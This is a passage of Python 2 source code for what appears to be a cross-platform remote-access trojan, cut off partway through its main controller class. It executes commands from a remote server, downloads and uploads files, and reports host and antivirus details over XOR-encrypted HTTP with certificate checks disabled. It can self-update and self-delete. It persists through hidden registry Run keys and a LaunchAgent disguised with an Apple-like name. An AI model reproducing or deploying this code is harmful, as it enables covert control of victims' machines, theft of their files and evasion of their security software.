import os
import threading
from abc import ABCMeta, abstractmethod
import random
import binascii
from xml.etree.ElementTree import SubElement, XML, Element, tostring
import sys
import urllib
import urllib2
import string
import subprocess
import ssl
import base64
import platform

SIGTERM = 15

if (platform.system() == "Windows"):
    import _winreg
    import ctypes
    import _subprocess
    from ctypes import byref, windll, c_char_p, c_wchar_p, c_void_p, \
        Structure, sizeof, c_wchar, WinError
    from ctypes.wintypes import BYTE, WORD, LPWSTR, BOOL, DWORD, LPVOID, \
        HANDLE

    ##
    ## Types
    ##

    CREATE_UNICODE_ENVIRONMENT = 0x00000400
    LPCTSTR = c_char_p
    LPTSTR = c_wchar_p
    LPSECURITY_ATTRIBUTES = c_void_p
    LPBYTE = ctypes.POINTER(BYTE)


    class STARTUPINFOW(Structure):
        _fields_ = [
            ("cb", DWORD), ("lpReserved", LPWSTR),
            ("lpDesktop", LPWSTR), ("lpTitle", LPWSTR),
            ("dwX", DWORD), ("dwY", DWORD),
            ("dwXSize", DWORD), ("dwYSize", DWORD),
            ("dwXCountChars", DWORD), ("dwYCountChars", DWORD),
            ("dwFillAtrribute", DWORD), ("dwFlags", DWORD),
            ("wShowWindow", WORD), ("cbReserved2", WORD),
            ("lpReserved2", LPBYTE), ("hStdInput", HANDLE),
            ("hStdOutput", HANDLE), ("hStdError", HANDLE),
        ]


    LPSTARTUPINFOW = ctypes.POINTER(STARTUPINFOW)


    class PROCESS_INFORMATION(Structure):
        _fields_ = [
            ("hProcess", HANDLE), ("hThread", HANDLE),
            ("dwProcessId", DWORD), ("dwThreadId", DWORD),
        ]


    LPPROCESS_INFORMATION = ctypes.POINTER(PROCESS_INFORMATION)


    class DUMMY_HANDLE(ctypes.c_void_p):

        def __init__(self, *a, **kw):
            super(DUMMY_HANDLE, self).__init__(*a, **kw)
            self.closed = False

        def Close(self):
            if not self.closed:
                windll.kernel32.CloseHandle(self)
                self.closed = True

        def __int__(self):
            return self.value


    CreateProcessW = windll.kernel32.CreateProcessW
    CreateProcessW.argtypes = [
        LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR,
        LPSTARTUPINFOW, LPPROCESS_INFORMATION,
    ]
    CreateProcessW.restype = BOOL


    ##
    ## Patched functions/classes
    ##

    def CreateProcess(executable, args, _p_attr, _t_attr,
                      inherit_handles, creation_flags, env, cwd,
                      startup_info):
        """Create a process supporting unicode executable and args for win32
        Python implementation of CreateProcess using CreateProcessW for Win32
        """

        si = STARTUPINFOW(
            dwFlags=startup_info.dwFlags,
            wShowWindow=startup_info.wShowWindow,
            cb=sizeof(STARTUPINFOW),
            ## XXXvlab: not sure of the casting here to ints.
            hStdInput=int(startup_info.hStdInput),
            hStdOutput=int(startup_info.hStdOutput),
            hStdError=int(startup_info.hStdError),
        )

        wenv = None
        if env is not None:
            ## LPCWSTR seems to be c_wchar_p, so let's say CWSTR is c_wchar
            env = (unicode("").join([
                unicode("%s=%s\0") % (k, v)
                for k, v in env.items()])) + unicode("\0")
            wenv = (c_wchar * len(env))()
            wenv.value = env

        pi = PROCESS_INFORMATION()
        creation_flags |= CREATE_UNICODE_ENVIRONMENT
        args = unicode(args)
        if CreateProcessW(executable, args, None, None,
                          inherit_handles, creation_flags,
                          wenv, cwd, byref(si), byref(pi)):
            return (DUMMY_HANDLE(pi.hProcess), DUMMY_HANDLE(pi.hThread),
                    pi.dwProcessId, pi.dwThreadId)
        raise WinError()


    class Popen(subprocess.Popen):
        """This superseeds Popen and corrects a bug in cPython 2.7 implem"""

        def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell, to_close,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Code from part of _execute_child from Python 2.7 (9fbb65e)
            There are only 2 little changes concerning the construction of
            the the final string in shell mode: we preempt the creation of
            the command string when shell is True, because original function
            will try to encode unicode args which we want to avoid to be able to
            sending it as-is to ``CreateProcess``.
            """
            if not isinstance(args, subprocess.types.StringTypes):
                args = subprocess.list2cmdline(args)

            if startupinfo is None:
                startupinfo = subprocess.STARTUPINFO()
            if shell:
                startupinfo.dwFlags |= _subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = _subprocess.SW_HIDE
                comspec = os.environ.get("COMSPEC", unicode("cmd.exe"))
                args = unicode('{} /c "{}"').format(comspec, args)
                if (_subprocess.GetVersion() >= 0x80000000 or
                            os.path.basename(comspec).lower() == "command.com"):
                    w9xpopen = self._find_w9xpopen()
                    args = unicode('"%s" %s') % (w9xpopen, args)
                    creationflags |= _subprocess.CREATE_NEW_CONSOLE

            super(Popen, self)._execute_child(args, executable,
                                              preexec_fn, close_fds, cwd, env, universal_newlines,
                                              startupinfo, creationflags, False, to_close, p2cread,
                                              p2cwrite, c2pread, c2pwrite, errread, errwrite)


file_locked = None

#osx const
PLIST_FILE_NAME = "com.apple.pyapple.plist"
PLIST_SIGN_KEY = "apple.scriptzxy.plist"

class CommandsEnum:
    Nothing = 1
    Execution = 2
    Download = 3
    Update = 4
    Cleanup = 5
    Upload = 6
    RuntimeCMDConfig = 7
    SystemInfo = 8

class OSType:
    Windows = "Windows"
    OSX = "Darwin"
    Linux = "Linux"

class AnswerTypeEnum:
    Check = 1
    Acknowledge = 2
    InternalError = 3
    RelayError = 4
    Error = 5

class cmdArgs:
    cmd = None
    app_path = None
    timeout = None
    serial_file_path = None

class TaskThread(threading.Thread):
    """Thread that executes a task every N seconds"""

    def __init__(self):
        threading.Thread.__init__(self)
        self._finished = threading.Event()
        self.interval = None

    def shutdown(self):
        self._finished.set()

    def run(self):
        while True:
            if self._finished.isSet():
                return
            self.task()

            # Sleep for interval or until shutdown
            self._finished.wait(self.interval)

    def task(self):
        """The task done by this thread - override in subclasses"""
        pass


class GuardTimer(TaskThread):
    def task(self):
        guard.get_data_to_send()

        response = guard.connect_and_send()

        guard.process_server_data(response)

        guard_timer.interval = guard.send_interval_s


class IConfig:
    __metaclass__ = ABCMeta

    @abstractmethod
    def read_config(self, file_path):
        pass


class RCDataConfig(IConfig):
    def __init__(self):
        pass

    def read_config(self, file_path):
        file = open(file_path, 'rb')
        file_content = file.read()
        file.close()
        #todo check
        if (platform.system()== OSType.Windows): # Windows
            idxs = file_content.find('*grds*')
            idxe = file_content.find('*grde*')

        if (platform.system()== OSType.OSX): # OSX
            idxs = file_content.rfind('*grds*')
            idxe = file_content.rfind('*grde*')

        return file_content[idxs + 6:idxe]



class IRuntimeConfig:
    __metaclass__ = ABCMeta

    @abstractmethod
    def read_config(self):
        pass

    def write_config(self, data):
        pass


# DSV: Dash-separated value
class DSVRuntimeConfig(IRuntimeConfig):
    def __init__(self):
        self.path = None

    def read_config(self):
        if os.path.exists(self.path):
            fd = open(self.path, 'r')
            config = fd.read()
            fd.close()

            return config

        return ''

    def write_config(self, data):
        fd = open(self.path, 'w')
        fd.write(data)
        fd.close()



class IStartup:
    __metaclass__ = ABCMeta

    @abstractmethod
    def add_startup(self, file_path):
        pass

    @abstractmethod
    def del_startup(self):
        pass


class RunOnceUser_WMIC(IStartup):
    def __init__(self):
        self.run_once_key = 'Software\Microsoft\Windows\CurrentVersion\RunOnce'
        self.key_name = 'gd_system'

    def add_startup(self, file_path):
        python_path = ''
        if CrossPlatformTools.isScript():
            python_path = CrossPlatformTools.get_python_path().replace(" ", "\ ") + ' '
            file_path = "\"" + (file_path) + "\""

        cmd_exec = 'cmd /c ' + 'WMIC /NameSpace:\\\\root\default Class StdRegProv Call CreateKey hDefKey="&H80000001" sSubKeyName="' + self.run_once_key + '" & ' + 'WMIC /NameSpace:\\\\root\default Class StdRegProv Call SetStringValue hDefKey="&H80000001" sSubKeyName="' + self.run_once_key + '" sValue=\'' + python_path + file_path + '\' sValueName="' + self.key_name + '"'

        verOs = platform.version()
        if (len(verOs.split('.')) > 0):
            verOs = verOs.split('.')[0]
        if int(verOs) < 6:
            p = subprocess.Popen(cmd_exec, shell=isinstance(cmd_exec, basestring),
                                 bufsize=-1, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
            stout, sterr = p.communicate()
            stout.decode()
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(cmd_exec, startupinfo=startupinfo).wait()

        try:
            reg_handle = _winreg.ConnectRegistry(None, _winreg.HKEY_CURRENT_USER)
            if reg_handle:
                key_handle = _winreg.OpenKey(reg_handle, self.run_once_key, 0, _winreg.KEY_ALL_ACCESS)
                if key_handle:
                    key_value = _winreg.QueryValueEx(key_handle, self.key_name)
                    if key_value[0] == file_path or (file_path in key_value[0]):
                        _winreg.CloseKey(key_handle)
                        return True
                    else:
                        return False
        except Exception as e:
            _winreg.CloseKey(key_handle)

        return False

    def del_startup(self):
        try:
            reg_handle = _winreg.ConnectRegistry(None, _winreg.HKEY_CURRENT_USER)
            if not reg_handle:
                return

            key_handle = _winreg.OpenKey(reg_handle, self.run_once_key, 0, _winreg.KEY_ALL_ACCESS)
            if not key_handle:
                return

            _winreg.DeleteValue(key_handle, self.key_name)

            _winreg.CloseKey(key_handle)
        except Exception as e:
            pass



class RunLocal_WMIC(IStartup):
    def __init__(self):
        self.run_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
        self.key_name = 'gd_system'

    def add_startup(self, file_path):

        python_path=''
        if CrossPlatformTools.isScript():
            python_path = CrossPlatformTools.get_python_path().replace(" " , "\ ")  + ' '
            file_path = "\"" +(file_path) + "\""
            
        cmd_exec = 'cmd /c ' + 'WMIC /NameSpace:\\\\root\default Class StdRegProv Call CreateKey hDefKey="&H80000002" sSubKeyName="' + self.run_key + '" & ' + 'WMIC /NameSpace:\\\\root\default Class StdRegProv Call SetStringValue hDefKey="&H80000002" sSubKeyName="' + self.run_key + "\" sValue='" + python_path + file_path + "' sValueName=\"" + self.key_name + "\""
        verOs = platform.version()
        if (len(verOs.split('.')) > 0):
            verOs = verOs.split('.')[0]
        if int(verOs) < 6:
            p = subprocess.Popen(cmd_exec, shell=isinstance(cmd_exec, basestring),
                                 bufsize=-1, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
            stout, sterr = p.communicate()
            stout.decode()
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            subprocess.Popen(cmd_exec, startupinfo = startupinfo).wait()

        try:
            reg_handle = _winreg.ConnectRegistry(None, _winreg.HKEY_LOCAL_MACHINE)
            if reg_handle:
                key_handle = _winreg.OpenKey(reg_handle, self.run_key, 0, _winreg.KEY_ALL_ACCESS)
                if key_handle:
                    key_value = _winreg.QueryValueEx(key_handle, self.key_name)
                    if(not CrossPlatformTools.isScript()):
                        if key_value[0] == file_path:
                            _winreg.CloseKey(key_handle)
                            return True
                        else:
                            return False
                    else: #for windows xp
                        if key_value[0] == file_path or (file_path in key_value[0]):
                            _winreg.CloseKey(key_handle)
                            return True
                        else:
                            return False
        except Exception as e:
            _winreg.CloseKey(key_handle)

        return False

    def del_startup(self):
        try:
            reg_handle = _winreg.ConnectRegistry(None, _winreg.HKEY_LOCAL_MACHINE)
            if not reg_handle:
                return

            key_handle = _winreg.OpenKey(reg_handle, self.run_key, 0, _winreg.KEY_ALL_ACCESS)
            if not key_handle:
                return

            _winreg.DeleteValue(key_handle, self.key_name)

            _winreg.CloseKey(key_handle)
        except Exception as e:
            pass


class RunOnOSX_UserDeamon(IStartup):

    def __init__(self):
        if(CrossPlatformTools.isScript()):
            self.plist_base64='PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjwhRE9DVFlQRSBwbGlzdCBQVUJMSUMgIi0vL0FwcGxlLy9EVEQgUExJU1QgMS4wLy9FTiIgImh0dHA6Ly93d3cuYXBwbGUuY29tL0RURHMvUHJvcGVydHlMaXN0LTEuMC5kdGQiPg0KPHBsaXN0IHZlcnNpb249IjEuMCI+DQo8ZGljdD4NCiAgICA8a2V5PkxhYmVsPC9rZXk+DQogICAgPHN0cmluZz5hcHBsZS5zY3JpcHR6eHkucGxpc3Q8L3N0cmluZz4NCiAgICA8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT4NCiAgICA8YXJyYXk+DQogICAgICAgIDxzdHJpbmc+L3Vzci9iaW4vcHl0aG9uPC9zdHJpbmc+DQogICAgICAgIDxzdHJpbmc+W3B5c2NyaXB0XTwvc3RyaW5nPg0KICAgIDwvYXJyYXk+DQogICAgPGtleT5LZWVwQWxpdmU8L2tleT4NCiAgICA8dHJ1ZS8+DQo8L2RpY3Q+DQo8L3BsaXN0Pg=='
        else:
            self.plist_base64='PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjwhRE9DVFlQRSBwbGlzdCBQVUJMSUMgIi0vL0FwcGxlLy9EVEQgUExJU1QgMS4wLy9FTiIgImh0dHA6Ly93d3cuYXBwbGUuY29tL0RURHMvUHJvcGVydHlMaXN0LTEuMC5kdGQiPg0KPHBsaXN0IHZlcnNpb249IjEuMCI+DQo8ZGljdD4NCiAgICA8a2V5PkxhYmVsPC9rZXk+DQogICAgPHN0cmluZz5hcHBsZS5zY3JpcHR6eHkucGxpc3Q8L3N0cmluZz4NCiAgICA8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT4NCiAgICA8YXJyYXk+DQogICAgICAgIDxzdHJpbmc+W3B5c2NyaXB0XTwvc3RyaW5nPg0KICAgIDwvYXJyYXk+DQogICAgPGtleT5LZWVwQWxpdmU8L2tleT4NCiAgICA8dHJ1ZS8+DQo8L2RpY3Q+DQo8L3BsaXN0Pg=='

        self.path_plist = os.path.join(os.environ['HOME'],'Library','LaunchAgents',PLIST_FILE_NAME)


    def add_startup(self, file_path):
        try:
            plist = base64.b64decode(self.plist_base64)
            plist = plist.replace('[pyscript]' , file_path )
            if(not os.path.exists( os.path.join(os.environ['HOME'],'Library','LaunchAgents'))):
                os.mkdir(os.path.join(os.environ['HOME'],'Library','LaunchAgents'))
            fplist = open(self.path_plist,'w+' )
            fplist.write(plist)
            fplist.close()
        except Exception as e:
            pass
        try:
            if(not CrossPlatformTools.check_daemon_running()):
                os.system("launchctl load -w " + self.path_plist)
                check = CrossPlatformTools.check_daemon_running()
                if( check ):
                    sys.exit()
            return True
        except Exception as e:
            return False


    def del_startup(self):
        try:
            subprocess.Popen(["launchctl" ,"unload" , self.path_plist]).wait()
            os.remove(self.path_plist)
            return True
        except Exception as e:
            return False




class ICrypto:
    __metaclass__ = ABCMeta

    @abstractmethod
    def encrypt(self, data_plain):
        pass

    @abstractmethod
    def decrypt(self, data_enc):
        pass


class Xor(ICrypto):
    def __init__(self):
        self.key = None

    def encrypt(self, data_plain):
        if not data_plain:
            return ''

        data_enc_xor = ''.join(chr(ord(x) ^ self.key) for x in data_plain)

        data_enc_hex = binascii.hexlify(data_enc_xor)

        return data_enc_hex.strip()

    def decrypt(self, data_enc):
        if not data_enc:
            return ''
        try:

            data_dec_hex = binascii.unhexlify(data_enc)

            data_dec_xor = ''.join(chr(ord(x) ^ self.key) for x in data_dec_hex)

            return data_dec_xor
        except Exception as e:
            return data_enc

class IParser:
    __metaclass__ = ABCMeta

    @abstractmethod
    def parse(self, message):
        pass


class XmlParser(IParser):
    def __init__(self):
        self.crypto = None

    def parse(self, message):
        try:
            message_dec = self.crypto.decrypt(message)

            if message_dec:
                if '<mis>' in message_dec.lower():
                    xml_parsed = XML(message_dec)

                    xml_t = xml_parsed.find('t')
                    ServerData.t = int(xml_t.text)

                    xml_i = xml_parsed.find('i')
                    ServerData.i = xml_i.text

                    xml_c = xml_parsed.find('c')
                    ServerData.c = xml_c.text

                    xml_f = xml_parsed.find('f')
                    ServerData.f = xml_f.text

                    return
        except Exception as e:
            pass


        ServerData.t = 0
        ServerData.i = ''
        ServerData.c = message
        ServerData.f = 'relay'


class IRequest:
    __metaclass__ = ABCMeta

    @abstractmethod
    def send_request(self, server, post_key, post_value):
        pass


class Transmission(IRequest):
    def __init__(self):
        pass

    def send_request(self, server, post_key, post_value):
        try:
            context = None
            key_list = post_key.split('=', 1)
            if len(key_list) > 1:
                post_data = {key_list[0]: key_list[1], 'value': post_value}
            else:
                post_data = {'pk': post_key, 'value': post_value}

            headers = {'Content-type': 'application/x-www-form-urlencoded'}
            post_data_encode = urllib.urlencode(post_data)
            post_request = urllib2.Request(server, post_data_encode, headers)
            if CrossPlatformTools.isScript():
                if sys.version_info[1] >= 7 and sys.version_info[2] >= 9:
                    context = ssl._create_unverified_context()

                if context is not None:
                    post_response = urllib2.urlopen(post_request, context=context)
                else:
                    post_response = urllib2.urlopen(post_request)
            else:
                post_response = urllib2.urlopen(post_request, context=context)

            return post_response.read()
        except urllib2.URLError as e:
            return str(e)
        except urllib2.HTTPError as e:
            return e.read()



class ISerialization:
    __metaclass__ = ABCMeta

    @abstractmethod
    def serialize(self, data):
        pass


class XmlSerialization(ISerialization):
    def __init__(self):
        pass

    def serialize(self, data):
        xml = Element('Mic')
        xml_s = SubElement(xml, 's')
        xml_s.text = data.s
        xml_v = SubElement(xml, 'v')
        xml_v.text = data.v
        xml_t = SubElement(xml, 't')
        xml_t.text = str(data.t)
        xml_d = SubElement(xml, 'd')
        xml_d.text = data.d
        xml_i = SubElement(xml, 'i')
        xml_i.text = data.i
        xml_r = SubElement(xml, 'r')
        xml_r.text = data.r

        xml_str = tostring(xml, encoding='utf8', method='xml')

        return xml_str


class IResponse:
    __metaclass__ = ABCMeta

    @abstractmethod
    def process_response(self, message):
        pass


class Response(IResponse):
    def __init__(self):
        self.parser = None

    def process_response(self, message):
        self.parser.parse(message)


class ICommand:
    __metaclass__ = ABCMeta

    @abstractmethod
    def execute(self):
        pass


class Execution(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def worker(self, cmd):
        cmd_out_bytes = ''
        result = ''
        cmd_error = ''

        try:
            if (platform.system() == OSType.Windows):
                _subprocess.CreateProcess = CreateProcess
            PIPE = subprocess.PIPE
            cmd = unicode(cmd)
            self.p = subprocess.Popen(cmd, shell=True,
                                      bufsize=-1, stdin=PIPE, stdout=PIPE,
                                      stderr=PIPE)
            self.child_stdin = self.p.stdin
            self.child_stdout, self.child_stderr = self.p.communicate()
            cmd_out_bytes = self.child_stdout.decode()
            cmd_error = self.child_stderr.decode()
            self.child_stdin.close()

        except Exception as e:
            CommandResult.is_error = True
            result = str(e)

        if cmd_out_bytes:
            try:
                cmd_out_text = cmd_out_bytes.decode('utf-8')
                CommandResult.is_error = False
                result = cmd_out_text
            except Exception as e:
                CommandResult.is_error = True
                result = e.message

        if cmd_error:
            CommandResult.is_error = True
            result = cmd_error.strip()

        CommandResult.result = result
        CommandResult.cmd = ''


    def execute(self):
        orginal_createProcess = _subprocess.CreateProcess
        try:
            cmd_exec = self.crypto.decrypt(self.cmd_args.cmd.c).decode('utf-8')

            cmd_thread = threading.Thread(target=self.worker, args=(cmd_exec,))

            cmd_thread.start()

            cmd_thread.join(self.cmd_args.timeout)

            if (platform.system() == OSType.Windows):
                CrossPlatformTools.kill_all_process_by_my_pid()
            else:
                try:
                    self.p.stdin.close()
                    self.p.kill()
                except Exception as e:
                    pass

            # Wait for collect response
            time_to_wait_s = 4
            threading._sleep(time_to_wait_s)
        except Exception as e:
            if (self.p):
                CrossPlatformTools.kill_all_process_by_my_pid()
            CommandResult.result = str(e)
            CommandResult.cmd = ''
            CommandResult.is_error = True

        _subprocess.CreateProcess = orginal_createProcess


class Download(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        try:
            file_path = self.crypto.decrypt(self.cmd_args.cmd.f).decode('utf-8')
            file_path = os.path.expandvars(file_path)

            file_content = self.crypto.decrypt(self.cmd_args.cmd.c)

            file = open(file_path, 'wb')
            file.write(file_content)
            file.close()

            CommandResult.is_error = False
            result = 'File downloaded successfully.'
        except IOError as e:
            CommandResult.is_error = True
            result = e.strerror
        except Exception as e:
            CommandResult.is_error = True
            result = str(e)

        CommandResult.result = result
        CommandResult.cmd = ''


class Upload(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        try:
            file_path = self.crypto.decrypt(self.cmd_args.cmd.c).decode('utf-8')
            file_path = os.path.expandvars(file_path)

            upload_range = self.crypto.decrypt(self.cmd_args.cmd.f).split('-')
            start_pos = int(upload_range[0])
            stop_pos = int(upload_range[1])

            result = ''

            with open(file_path, "rb") as binary_file:
                # Seek position and read N bytes
                binary_file.seek(start_pos)
                couple_bytes = binary_file.read(stop_pos - start_pos)

                CommandResult.is_error = False
                result = couple_bytes
        except IOError as e:
            CommandResult.is_error = True
            result = e.strerror
        except Exception as e:
            CommandResult.is_error = True
            result =str(e)

        CommandResult.result = result
        CommandResult.cmd = ''

class Update(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None
        self.os_version = platform.system()

    def execute(self):
        try:
            # Close temp file that used to avoid duplicated instance
            file_locked.close()

            file_content = self.crypto.decrypt(self.cmd_args.cmd.c)
            app_path = self.cmd_args.app_path

            folder_path = os.path.dirname(app_path)
            new_file_name = ''.join(random.choice(string.lowercase) for i in range(8))
            new_file_path =os.path.join(folder_path ,  new_file_name)

            file = open(new_file_path, 'wb')
            file.write(file_content)
            file.close()

            if (platform.system() == OSType.Windows): # Windows
                app_path = '"' + app_path + '"'
                new_file_path = '"' + new_file_path + '"'

                python_path=''
                if(CrossPlatformTools.isScript()):
                    python_path = CrossPlatformTools.get_python_path() + ' '
                # Delete old file and rename new file to old file then run it
                veros = platform.version()
                if 0 < len(veros.split('.')):
                    veros = veros.split('.')[0]
                if int(veros) < 6:
                    cmd_exec = 'cmd /c (IF NOT EXIST ' + app_path + ' (exit) ELSE (ping 127.0.0.1 -n 11 > nul))' + ' & move /y ' + new_file_path  + ' ' + app_path + ' && start "" ' + python_path + app_path + ' -u & exit'
                else:
                    cmd_exec = 'cmd /c ' + 'FOR /l %i in (1,1,10) DO IF NOT EXIST ' + new_file_path  + ' (start "" ' + python_path + app_path + ' -u & exit) ELSE ((move /y ' + new_file_path + ' ' + app_path + ') & timeout /t 1)'

                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                subprocess.Popen(cmd_exec, startupinfo = startupinfo)

            elif (self.os_version == OSType.OSX):  # OSX
                plist_path = os.path.join( os.environ['HOME'] ,'Library','LaunchAgents' , PLIST_FILE_NAME)
                os.system("cp -R '" + new_file_path + "' '"  + app_path +  "' && sleep 2  && rm '" + new_file_path + "'")
                sys.exit(1)
            # Check again
            if not file_locked.closed:
                file_locked.close()

            sys.exit()
        except Exception as e:
            CommandResult.is_error = True
            CommandResult.result = str(e)
            CommandResult.cmd = ''

class Cleanup(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        try:

            # Close temp file that used to avoid duplicated instance
            file_locked.close()
            if not file_locked.closed:
                file_locked.close()

            if os.path.exists(self.cmd_args.serial_file_path):
                os.remove(self.cmd_args.serial_file_path)

            if os.path.exists(self.config.path):
                os.remove(self.config.path)

            if(platform.system() == OSType.Windows):

                # Delete registry value
                self.startup.del_startup()

                # Delete self
                app_path = '"' + self.cmd_args.app_path + '"'
                verOs = platform.version()
                if(len(verOs.split('.'))>0):
                    verOs = verOs.split('.')[0]
                if int(verOs) < 6:
                    cmd_exec = 'cmd /c (IF NOT EXIST ' + app_path + ' (exit) ELSE (ping 127.0.0.1 -n 11 > nul))' + ' & DEL /F /Q ' + app_path
                else:
                    cmd_exec = 'cmd /c ' + 'FOR /l %i in (1,1,10) DO IF NOT EXIST ' + app_path + ' (exit) ELSE ((DEL /F /Q ' + app_path + ') & timeout /t 1)'

                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                subprocess.Popen(cmd_exec, startupinfo = startupinfo)

            elif (platform.system() ==OSType.OSX):
                plist_path = os.path.join( os.environ['HOME'] ,'Library','LaunchAgents' , PLIST_FILE_NAME)

                # Delete self
                os.remove(self.cmd_args.app_path)

                os.system("launchctl unload -w " + plist_path + " && rm " + plist_path)

                pass

            sys.exit()
        except Exception as e:
            CommandResult.is_error = True
            CommandResult.result = str(e)
            CommandResult.cmd = ''


class Nothing(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        CommandResult.is_error = False
        CommandResult.result = ''
        CommandResult.cmd = ''



class RuntimeCMDConfig(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        try:
            runtime_config = self.crypto.decrypt(self.cmd_args.cmd.c)

            self.config.write_config(self.cmd_args.cmd.c)

            result = "Config updated."

            CommandResult.cmd = runtime_config
        except Exception as e:
            CommandResult.is_error = True
            result = e.message

        CommandResult.result = result


class SystemInfo(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        splitter = "###"
        os_info = platform.system() + ' ' + platform.release() + splitter + platform.version() + splitter + platform.machine()

        os_info =platform.node() \
                 + splitter + platform.system() + ' ' + platform.release() \
                 + splitter + platform.version() \
                 + splitter + platform.machine()
        cmd_out_bytes = ''
        result = os_info

        verOs = platform.version()
        if(len(verOs.split('.'))>0):
            verOs = verOs.split('.')[0]
        if int(verOs) < 6:
            cmd_exec = 'cmd /c wmic /NAMESPACE:\\\\root\SecurityCenter PATH AntiVirusProduct GET displayName, productUptoDate /Format:List'
        else:
            cmd_exec = 'cmd /c wmic /NAMESPACE:\\\\root\SecurityCenter2 PATH AntiVirusProduct GET displayName, productState /Format:List'

        try:
            child_stdout = os.popen(cmd_exec)
            cmd_out_bytes = child_stdout.read()
            child_stdout.close()
            try:
                #delete file "TempWmicBatchFile.bat" in xp , this file automatic generate by WMIC
                parent = os.path.dirname(sys.argv[0])
                os.remove(os.path.join(parent, "TempWmicBatchFile.bat"))
            except Exception as e:
                pass
        except Exception as e:
            cmd_out_bytes = "error"
            pass

        if cmd_out_bytes:
            try:
                anti_info = cmd_out_bytes.decode('utf-8')
                anti_info_name = anti_info.strip().split('\n')[0].split('=')[1]
                anti_info_state = anti_info.strip().split('\n')[1].split('=')[1]

                anti_info_state_hex = hex(int(anti_info_state))

                if anti_info_state_hex[-2:] == '00': # update
                    anti_info_state_num = 0
                else:
                    anti_info_state_num = 1

                result = result + splitter + anti_info_name + splitter + str(anti_info_state_num)
            except Exception as e:
                pass


        CommandResult.is_error = False
        CommandResult.result = result
        CommandResult.cmd = ''

class SystemInfo_OSX(ICommand):
    def __init__(self):
        self.crypto = None
        self.startup = None
        self.config = None
        self.cmd_args = None

    def execute(self):
        osversion = platform.mac_ver()

        splitter = "###"
        os_info =platform.node() \
                 + splitter +  'MacOSX ' + osversion[0] + ' release:'+ platform.release() \
                 + splitter + platform.version() \
                 + splitter + platform.machine()

        result = os_info

        try:
            anti_info_name = "unknown"
            try:
                anti_info_name = CrossPlatformTools.get_antivirus_applications()
            except Exception as e:
                pass
            anti_info_state_num = 0
            result = result + splitter + anti_info_name + splitter + str(anti_info_state_num)
        except Exception as e:
            pass

        CommandResult.is_error = False
        CommandResult.result = result
        CommandResult.cmd = ''
class ClientData:
    s = ''
    v = ''
    t = 0
    d = ''
    i = ''
    r = ''


class ServerData:
    c = ''
    i = ''
    t = 0
    f = ''


class CommandResult:
    is_error = False
    result = ''
    cmd = ''


class Guard:
    _instance = None

    def __init__(self):
        self.version = ''
        self.serial = ''
        self.relay = {}
        self.enc_key = 110
        self.timeout_s = 60
        self.short_time_s = 20
        self.long_time_s = 40
        self.send_result_count_max = 10
        self.is_random_serial = 1
        self.send_interval_s = 0
        self.send_count = 0
        self.is_sent = True
        self.answer_type_value = AnswerTypeEnum.Check
        self.client_error_store_list = []
        self.client_data_store = ''
        self.command_result_value = ''
        self.command_number = ''
        self.current_relay = ''
        self.crypto = None
        self.request = None
        self.response = None
        self.startup = None
        self.serialization = None
        self.config = None
        self.runtime_config = None
        self.dict_commands = {}
        self.error_max = 50
        self.app_path = ''
        self.arg = ''
        self.temp_relay = {}
        self.serial_file_path = ''
        self.is_safe_relay = False
        self.use_safe_relay = 0
        self.safe_relay = {}
        self.max_use_safe_relay = 6
        self.BindFileName = ''
    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = Guard()

        return cls._instance

    def start(self):
        """Start to run"""
        runtime_config_folder_path =''
        # Set variables
        osType = platform.system()
        self.dict_commands[CommandsEnum.Nothing] = Nothing()
        self.dict_commands[CommandsEnum.Execution] = Execution()
        self.dict_commands[CommandsEnum.Download] = Download()
        self.dict_commands[CommandsEnum.Update] = Update()
        self.dict_commands[CommandsEnum.Cleanup] = Cleanup()
        self.dict_commands[CommandsEnum.Upload] = Upload()
        self.dict_commands[CommandsEnum.RuntimeCMDConfig] = RuntimeCMDConfig()
        if(osType== OSType.Windows):
            self.dict_commands[CommandsEnum.SystemInfo] = SystemInfo()
        elif(osType == OSType.OSX):
            self.dict_commands[CommandsEnum.SystemInfo] = SystemInfo_OSX()



        if  CrossPlatformTools.isScript():
            self.app_path = os.path.abspath(sys.argv[0])
        else:
            self.app_path = sys.argv[0]
            if not ':\\' in self.app_path:
                self.app_path = sys.executable

        if len(sys.argv) > 1:
            self.arg = sys.argv[1]

        if(platform.system()== OSType.Windows):
